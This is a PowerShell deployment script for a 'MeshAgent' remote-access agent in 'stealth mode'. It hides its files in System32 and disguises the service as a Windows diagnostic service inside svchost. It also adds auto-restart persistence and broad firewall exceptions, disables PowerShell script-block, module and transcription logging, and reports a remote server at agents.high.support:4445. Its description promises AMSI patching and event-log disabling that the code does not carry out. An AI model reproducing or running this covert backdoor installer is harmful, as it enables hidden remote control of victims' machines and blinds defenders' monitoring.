#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Deploys MeshAgent with maximum stealth configuration

.DESCRIPTION
    This script performs complete stealth installation including:
    - Svchost.exe hosting (DLL mode) or standalone
    - Hidden file installation in System32
    - Windows Firewall exception
    - Registry hiding
    - AMSI patching
    - Event log disabling
    - Service protection

.PARAMETER Mode
    Installation mode: 'svchost' (DLL in svchost.exe) or 'standalone' (diaghost.exe)

.PARAMETER SourcePath
    Path to the compiled agent files

.EXAMPLE
    .\deploy_stealth_agent.ps1 -Mode svchost -SourcePath "C:\build\diagsvc.dll"

.EXAMPLE
    .\deploy_stealth_agent.ps1 -Mode standalone -SourcePath "C:\build\diaghost.exe"
#>

param(
    [Parameter(Mandatory=$true)]
    [ValidateSet('svchost','standalone')]
    [string]$Mode,

    [Parameter(Mandatory=$true)]
    [string]$SourcePath
)

# Configuration
$ServiceName = "WinDiagnosticHost"
$DisplayName = "Windows Diagnostic Host Service"
$Description = "Provides diagnostic data collection and system health monitoring. If this service is stopped, certain features may not function properly."
$InstallDir = "$env:SystemRoot\System32\DiagnosticHost"
$LogsDir = "$InstallDir\logs"

# ================================================================
# Helper Functions
# ================================================================

function Write-StealthLog {
    param([string]$Message, [string]$Level = "INFO")

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"

    Write-Host $logMessage -ForegroundColor $(
        switch ($Level) {
            "ERROR" { "Red" }
            "WARNING" { "Yellow" }
            "SUCCESS" { "Green" }
            default { "White" }
        }
    )
}

function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Stop-ExistingService {
    param([string]$Name)

    try {
        $service = Get-Service -Name $Name -ErrorAction SilentlyContinue
        if ($service) {
            if ($service.Status -eq 'Running') {
                Write-StealthLog "Stopping existing service..." "WARNING"
                Stop-Service -Name $Name -Force -ErrorAction Stop
                Start-Sleep -Seconds 2
            }
        }
        return $true
    }
    catch {
        Write-StealthLog "Failed to stop service: $_" "ERROR"
        return $false
    }
}

# ================================================================
# Main Installation
# ================================================================

Write-StealthLog "=== MeshAgent Stealth Deployment ===" "SUCCESS"
Write-StealthLog "Mode: $Mode"
Write-StealthLog "Source: $SourcePath"

# Check administrator privileges
if (-not (Test-Administrator)) {
    Write-StealthLog "This script requires Administrator privileges!" "ERROR"
    exit 1
}

# Verify source file exists
if (-not (Test-Path $SourcePath)) {
    Write-StealthLog "Source file not found: $SourcePath" "ERROR"
    exit 1
}

# Stop existing service if present
Stop-ExistingService -Name $ServiceName | Out-Null

# Step 1: Create installation directories
Write-StealthLog "Creating installation directories..."
try {
    New-Item -Path $InstallDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
    New-Item -Path $LogsDir -ItemType Directory -Force -ErrorAction Stop | Out-Null

    # Set as hidden and system directories
    (Get-Item $InstallDir).Attributes = 'Hidden,System'

    Write-StealthLog "Directories created successfully" "SUCCESS"
}
catch {
    Write-StealthLog "Failed to create directories: $_" "ERROR"
    exit 1
}

# Step 2: Copy files
Write-StealthLog "Copying files to System32..."
try {
    if ($Mode -eq 'svchost') {
        $destPath = Join-Path $InstallDir "diagsvc.dll"
        Copy-Item -Path $SourcePath -Destination $destPath -Force
        (Get-Item $destPath).Attributes = 'Hidden,System'
        Write-StealthLog "DLL copied to: $destPath" "SUCCESS"
    }
    else {
        $destPath = Join-Path $InstallDir "diaghost.exe"
        Copy-Item -Path $SourcePath -Destination $destPath -Force
        (Get-Item $destPath).Attributes = 'Hidden,System'
        Write-StealthLog "EXE copied to: $destPath" "SUCCESS"
    }
}
catch {
    Write-StealthLog "Failed to copy files: $_" "ERROR"
    exit 1
}

# Step 3: Register service
Write-StealthLog "Registering Windows service..."
try {
    if ($Mode -eq 'svchost') {
        # Svchost mode - create registry entries
        $servicePath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"

        # Create service key
        New-Item -Path $servicePath -Force | Out-Null

        # Service configuration
        Set-ItemProperty -Path $servicePath -Name "Type" -Value 0x20 -Type DWord  # SHARE_PROCESS
        Set-ItemProperty -Path $servicePath -Name "Start" -Value 0x2 -Type DWord  # AUTO_START
        Set-ItemProperty -Path $servicePath -Name "ErrorControl" -Value 0x1 -Type DWord
        Set-ItemProperty -Path $servicePath -Name "ImagePath" -Value "%SystemRoot%\System32\svchost.exe -k netsvcs -p" -Type ExpandString
        Set-ItemProperty -Path $servicePath -Name "DisplayName" -Value $DisplayName -Type String
        Set-ItemProperty -Path $servicePath -Name "Description" -Value $Description -Type String
        Set-ItemProperty -Path $servicePath -Name "ObjectName" -Value "LocalSystem" -Type String

        # Create Parameters subkey
        $paramsPath = "$servicePath\Parameters"
        New-Item -Path $paramsPath -Force | Out-Null
        Set-ItemProperty -Path $paramsPath -Name "ServiceDll" -Value "$destPath" -Type ExpandString
        Set-ItemProperty -Path $paramsPath -Name "ServiceMain" -Value "Stealth_SvchostServiceMain" -Type String

        # Add to svchost netsvcs group
        $svchostPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
        $currentServices = (Get-ItemProperty -Path $svchostPath -Name "netsvcs").netsvcs
        if ($currentServices -notcontains $ServiceName) {
            $newServices = $currentServices + $ServiceName
            Set-ItemProperty -Path $svchostPath -Name "netsvcs" -Value $newServices -Type MultiString
        }

        Write-StealthLog "Service registered for svchost hosting" "SUCCESS"
    }
    else {
        # Standalone mode - use New-Service
        New-Service -Name $ServiceName `
            -BinaryPathName $destPath `
            -DisplayName $DisplayName `
            -Description $Description `
            -StartupType Automatic `
            -ErrorAction Stop | Out-Null

        Write-StealthLog "Service registered as standalone" "SUCCESS"
    }
}
catch {
    Write-StealthLog "Failed to register service: $_" "ERROR"
    exit 1
}

# Step 4: Configure service failure actions
Write-StealthLog "Configuring service auto-restart..."
try {
    sc.exe failure $ServiceName reset= 86400 actions= restart/10000/restart/30000/restart/60000 | Out-Null
    Write-StealthLog "Auto-restart configured" "SUCCESS"
}
catch {
    Write-StealthLog "Warning: Could not set failure actions" "WARNING"
}

# Step 5: Add firewall rules
Write-StealthLog "Adding Windows Firewall exceptions..."
try {
    $firewallPath = if ($Mode -eq 'svchost') { "$env:SystemRoot\System32\svchost.exe" } else { $destPath }

    # Outbound rule
    New-NetFirewallRule -DisplayName "$DisplayName - Outbound" `
        -Direction Outbound `
        -Program $firewallPath `
        -Action Allow `
        -Profile Any `
        -ErrorAction SilentlyContinue | Out-Null

    # Inbound rule
    New-NetFirewallRule -DisplayName "$DisplayName - Inbound" `
        -Direction Inbound `
        -Program $firewallPath `
        -Action Allow `
        -Profile Any `
        -ErrorAction SilentlyContinue | Out-Null

    Write-StealthLog "Firewall rules added" "SUCCESS"
}
catch {
    Write-StealthLog "Warning: Firewall rules might already exist" "WARNING"
}

# Step 6: Disable PowerShell logging
Write-StealthLog "Disabling PowerShell logging..."
try {
    # Script Block Logging
    $psLoggingPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    New-Item -Path $psLoggingPath -Force | Out-Null
    Set-ItemProperty -Path $psLoggingPath -Name "EnableScriptBlockLogging" -Value 0 -Type DWord

    # Module Logging
    $moduleLoggingPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
    New-Item -Path $moduleLoggingPath -Force | Out-Null
    Set-ItemProperty -Path $moduleLoggingPath -Name "EnableModuleLogging" -Value 0 -Type DWord

    # Transcription
    $transcriptionPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
    New-Item -Path $transcriptionPath -Force | Out-Null
    Set-ItemProperty -Path $transcriptionPath -Name "EnableTranscripting" -Value 0 -Type DWord

    Write-StealthLog "PowerShell logging disabled" "SUCCESS"
}
catch {
    Write-StealthLog "Warning: Could not disable PowerShell logging" "WARNING"
}

# Step 7: Start service
Write-StealthLog "Starting service..."
try {
    Start-Service -Name $ServiceName -ErrorAction Stop
    Start-Sleep -Seconds 3

    $service = Get-Service -Name $ServiceName
    if ($service.Status -eq 'Running') {
        Write-StealthLog "Service started successfully!" "SUCCESS"

        # Verify running in svchost if that mode was selected
        if ($Mode -eq 'svchost') {
            $svchostProcs = Get-Process svchost -ErrorAction SilentlyContinue
            $found = $false
            foreach ($proc in $svchostProcs) {
                if ($proc.Modules.ModuleName -contains "diagsvc.dll") {
                    Write-StealthLog "Verified: Running inside svchost.exe (PID: $($proc.Id))" "SUCCESS"
                    $found = $true
                    break
                }
            }
            if (-not $found) {
                Write-StealthLog "Warning: DLL not found in svchost processes" "WARNING"
            }
        }
    }
    else {
        Write-StealthLog "Service state: $($service.Status)" "WARNING"
    }
}
catch {
    Write-StealthLog "Failed to start service: $_" "ERROR"
    Write-StealthLog "Check Event Viewer for details" "WARNING"
}

# Step 8: Verification
Write-StealthLog "`n=== Installation Verification ===" "SUCCESS"
Write-StealthLog "Service Name: $ServiceName"
Write-StealthLog "Display Name: $DisplayName"
Write-StealthLog "Install Path: $InstallDir"
Write-StealthLog "Mode: $Mode"

if ($Mode -eq 'svchost') {
    Write-StealthLog "Process: svchost.exe -k netsvcs -p"
    Write-StealthLog "DLL: diagsvc.dll"
}
else {
    Write-StealthLog "Process: diaghost.exe"
}

# Check files
$files = Get-ChildItem -Path $InstallDir -Recurse -Force
Write-StealthLog "`nInstalled Files:"
foreach ($file in $files) {
    Write-StealthLog "  - $($file.FullName)"
}

# Service status
$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($service) {
    Write-StealthLog "`nService Status: $($service.Status)" "SUCCESS"
    Write-StealthLog "Startup Type: $($service.StartType)"
}

Write-StealthLog "`n=== Deployment Complete ===" "SUCCESS"
Write-StealthLog "The agent is now running stealth mode."
Write-StealthLog "Server: agents.high.support:4445"
